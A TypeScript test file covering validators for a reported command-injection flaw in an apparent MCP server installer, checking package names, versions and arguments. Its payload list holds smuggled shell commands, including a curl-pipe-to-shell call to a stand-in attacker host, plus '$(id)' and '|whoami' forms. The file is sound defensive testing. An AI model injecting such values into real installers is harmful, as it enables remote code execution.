import { describe, expect, it } from 'vitest';

import { validatePackageName, validatePackageVersion } from '@/lib/security/package-name';
import { validateCommandArgs } from '@/lib/security/validators';

/**
 * Regression tests for the command injection reported by Syed Anas Mohiuddin
 * (2026-09-01): a shell metacharacter inside a user-supplied `args` entry was
 * lifted out as the "package name" and interpolated into an `exec()` string,
 * so `npx` + `["evil; touch /tmp/PWNED #"]` ran as two shell statements.
 *
 * `validateCommand` has always rejected metacharacters; `validateCommandArgs`
 * did not, and the payload lives in args. These cover the gate. The handlers no
 * longer use a shell at all — see command-injection-handlers.test.ts.
 */
const INJECTION_PAYLOADS = [
  'evil-package; touch /tmp/PWNED #',
  'pkg && curl attacker.example/x | sh',
  'pkg`id`',
  'pkg$(id)',
  'pkg|whoami',
  'pkg>out.txt',
  'pkg<in.txt',
  'pkg{a,b}',
  'pkg&background',
  'pkg\nsecond-line',
];

const LEGITIMATE_ARGS = [
  '-y',
  '--port',
  '8080',
  '@modelcontextprotocol/server-filesystem',
  'mcp-server-git',
  '/home/user/some path/dir',
  'server_name-1.2.3',
  '--config=value',
  'https://example.com/sse',
];

/**
 * Args are handed to the spawned process as argv - StdioClientTransport, and
 * the bubblewrap/firejail wrappers, all pass arrays and there is no `shell:
 * true` anywhere on the path. So a metacharacter in an arg is not dangerous,
 * and it is routinely legitimate: every Smithery-style server passes its
 * settings as `--config '{"KEY":"value"}'`.
 *
 * The value that was dangerous is the *package name* the installer lifts out of
 * args, and that is validated by grammar in validatePackageName. Blanket-
 * rejecting metacharacters across all args protects nothing extra and breaks
 * real configurations - which it did, in production, for about half an hour.
 */
const REAL_WORLD_ARGS: string[][] = [
  ['-y', '@smithery/cli@latest', 'run', '@21st-dev/magic-mcp', '--config', '{"TWENTY_FIRST_API_KEY":"k"}'],
  ['-y', '@modelcontextprotocol/server-filesystem', '$USERPROFILE/proj'],
  ['-y', '@modelcontextprotocol/server-postgres', 'postgresql://u:p@h:5432/db'],
  ['-y', '@modelcontextprotocol/server-filesystem', '/Users/someone/My Documents'],
  ['--config', '{}'],
];

describe('validateCommandArgs', () => {
  it.each(REAL_WORLD_ARGS.map((a, i) => [i, a] as const))(
    'accepts real-world server args #%i',
    (_i, args) => {
      const result = validateCommandArgs(args);

      expect(result.valid).toBe(true);
      expect(result.sanitizedArgs).toEqual(args);
    }
  );

  it.each(LEGITIMATE_ARGS)('still accepts %j', (arg) => {
    expect(validateCommandArgs([arg]).valid).toBe(true);
  });

  it('keeps rejecting null bytes and overlong args', () => {
    expect(validateCommandArgs(['a\0b']).valid).toBe(false);
    expect(validateCommandArgs(['x'.repeat(4097)]).valid).toBe(false);
  });

  it('passes an injection payload through - it is stopped at the package name', () => {
    // Not a gap: the payload cannot become a shell statement because nothing on
    // this path uses a shell, and validatePackageName rejects it below.
    expect(validateCommandArgs([INJECTION_PAYLOADS[0]]).valid).toBe(true);
    expect(validatePackageName(INJECTION_PAYLOADS[0]).valid).toBe(false);
  });
});

describe('validatePackageName', () => {
  it.each(INJECTION_PAYLOADS)('rejects %j', (payload) => {
    expect(validatePackageName(payload).valid).toBe(false);
  });

  it.each([
    '@modelcontextprotocol/server-filesystem',
    'mcp-server-git',
    'express',
    'some.package',
    'pkg_underscore',
    'ghcr.io/veriteknik/pluggedin-app',
    'node:20-alpine',
    // Version specifiers: the `@` recurs, and these are the shapes actually
    // stored in production - rejecting them broke live servers once already.
    '@smithery/cli@latest',
    '@21st-dev/magic-mcp',
    'express@4.18.2',
    '@modelcontextprotocol/server-filesystem@0.6.2',
  ])('accepts %j', (name) => {
    expect(validatePackageName(name).valid).toBe(true);
  });

  it('rejects an empty name and a leading dash', () => {
    expect(validatePackageName('').valid).toBe(false);
    expect(validatePackageName('-rf').valid).toBe(false);
  });
});

describe('validatePackageVersion', () => {
  it.each(['1.2.3', 'latest', '^2.0.0', '1.0.0-beta.1', '20-alpine'])('accepts %j', (v) => {
    expect(validatePackageVersion(v).valid).toBe(true);
  });

  it.each(['1.0.0; id', '$(id)', '`id`', 'v1|whoami'])('rejects %j', (v) => {
    expect(validatePackageVersion(v).valid).toBe(false);
  });
});
